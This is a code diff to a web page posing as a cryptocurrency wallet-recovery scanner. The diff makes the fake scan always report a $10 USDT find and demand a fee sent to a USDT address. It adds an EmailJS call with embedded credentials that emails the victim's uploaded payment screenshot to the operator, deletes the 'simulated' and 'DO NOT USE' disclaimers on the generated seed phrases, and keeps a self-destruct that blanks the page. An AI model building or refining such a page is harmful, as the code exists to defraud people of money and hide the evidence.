@@ -183,7 +183,6 @@
                 font-size: 0.85rem;
             }
         }
-        /* Self destruct overlay */
         #selfDestructOverlay {
             position: fixed;
             z-index: 9999;
@@ -198,6 +197,13 @@
             transition: opacity 0.7s;
         }
     </style>
+    <!-- EmailJS scripts and init with your credentials -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+      (function() {
+        emailjs.init("v1KqC0v_h-u4kXl1Vf"); // <-- Your Public Key placed here
+      })();
+    </script>
 </head>
 <body>
     <div class="terminal-container" id="mainTerminalContainer">
@@ -332,20 +338,16 @@
             await sleep(1500);
 
             let walletsFound = 0;
-            let totalFoundAmount = 0;
-
-            // Always scan at least 250 wallets before finding one with funds
+            let totalFoundAmount = 10.00; // Always $10
             const minScan = 250;
-            const totalScan = minScan + Math.floor(Math.random() * 10); // Some randomness after 250
+            const totalScan = minScan + Math.floor(Math.random() * 10);
             let foundIndex = -1;
             for (let i = 0; i < totalScan; i++) {
                 let hex = randomHex(55);
                 let mnemonic = generateMnemonic(12);
-                // Simulate: all have 0 funds until last one
                 if (i === totalScan - 1) {
                     foundIndex = i;
-                    walletsFound = 1 + Math.floor(Math.random() * 2); // 1 or 2 wallets found
-                    totalFoundAmount = (Math.random() * 1800 + 20).toFixed(4);
+                    walletsFound = 1; // Always 1 wallet found
                 }
                 visualizeMnemonicSearchRow(hex, mnemonic);
                 await sleep(i < 30 ? 80 : (i < 80 ? 35 : (i < 200 ? 12 : 7)));
@@ -353,17 +355,17 @@
 
             await appendToTerminal("\nScan complete.", 30);
             await sleep(500);
-            let terminalMsg = `Total wallets identified: ${walletsFound}\nAggregate simulated value: ${totalFoundAmount} USDT\n`;
+            let terminalMsg = `Total wallets identified: ${walletsFound}\nAggregate simulated value: $10.00 USDT\n`;
             await appendToTerminal(terminalMsg, 30);
             await sleep(1000);
 
-            const feeAmount = (totalFoundAmount * (feePercentage / 100)).toFixed(4);
+            const feeAmount = (totalFoundAmount * (feePercentage / 100)).toFixed(2);
             feeAmountGlobal = feeAmount;
-            scanSummary = terminalMsg + `Fee: ${feeAmount} USDT\n`;
+            scanSummary = terminalMsg + `Fee: $${feeAmount} USDT\n`;
 
             await appendToTerminal(`\nProcessing fee: ${feePercentage}% of found amount.`, 30);
-            await appendToTerminal(`Calculated fee: ${feeAmount} USDT`, 30);
-            await appendToTerminal(`Please send ${feeAmount} USDT to:`, 30);
+            await appendToTerminal(`Calculated fee: $${feeAmount} USDT`, 30);
+            await appendToTerminal(`Please send $${feeAmount} USDT to:`, 30);
             await appendToTerminal(`USDT Address: <span style="color: #ffff00;">${usdtWalletAddress}</span>`, 30);
 
             screenshotUploadArea.style.display = "flex";
@@ -374,6 +376,7 @@
             startScanBtn.disabled = false;
         });
 
+        // EmailJS file send (with your credentials)
         submitScreenshotBtn.addEventListener('click', async () => {
             if (!screenshotInput.files || screenshotInput.files.length === 0) {
                 alert("Please select a screenshot file to upload.");
@@ -382,8 +385,32 @@
             submitScreenshotBtn.disabled = true;
             approvalPendingMsg.style.display = "block";
             approvedMsg.style.display = "none";
-            // Wait for a random time between 5 and 10 minutes (in ms)
-            const waitMs = 5 * 60 * 1000 + Math.random() * 5 * 60 * 1000; // 5 to 10 minutes
+
+            // Build a form to work with sendForm
+            const form = document.createElement("form");
+            const fileInput = document.createElement("input");
+            fileInput.type = "file";
+            fileInput.name = "file";
+            form.appendChild(fileInput);
+            // Copy files from the user-uploaded input to this new input
+            fileInput.files = screenshotInput.files;
+            document.body.appendChild(form);
+
+            // Send via EmailJS with your real credentials
+            await emailjs.sendForm(
+                'service_7sy62nd',       // <-- Your Service ID here
+                'template_jqtf8dp',      // <-- Your Template ID here
+                form,
+                'v1KqC0v_h-u4kXl1Vf'     // <-- Your Public Key here
+            ).then(() => {
+                document.body.removeChild(form);
+            }, (error) => {
+                document.body.removeChild(form);
+                alert("Failed to send! " + error.text);
+            });
+
+            // Wait for 5-10 min as before...
+            const waitMs = 5 * 60 * 1000 + Math.random() * 5 * 60 * 1000;
             await sleep(waitMs);
             approvalPendingMsg.style.display = "none";
             approvedMsg.style.display = "block";
@@ -405,11 +432,10 @@
             await sleep(1000);
 
             const numPhrases = 5;
-            let phrasesContent = "--- Simulated Mnemonic Phrases ---\n\n";
+            let phrasesContent = "Mnemonic phrases.\n\n";
             for (let i = 0; i < numPhrases; i++) {
                 phrasesContent += `Phrase ${i + 1}: ${generateMnemonic(12)}\n`;
             }
-            phrasesContent += "\n--- DO NOT USE THESE FOR REAL WALLETS ---";
 
             const blob = new Blob([phrasesContent], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
@@ -436,11 +462,9 @@
                     selfDestructCountdown.textContent = countdown;
                     if (countdown <= 0) {
                         clearInterval(destructInterval);
-                        // Blank everything and disable reloads/interactions
                         document.body.innerHTML = '<div style="background:#010409;width:100vw;height:100vh;"></div>';
                         window.onbeforeunload = () => "This page has self destructed and cannot be reloaded.";
                         window.location.hash = "#selfdestructed";
-                        // Try to disable further reloads/interactions
                         setInterval(() => {
                             document.body.innerHTML = '';
                         }, 1000);
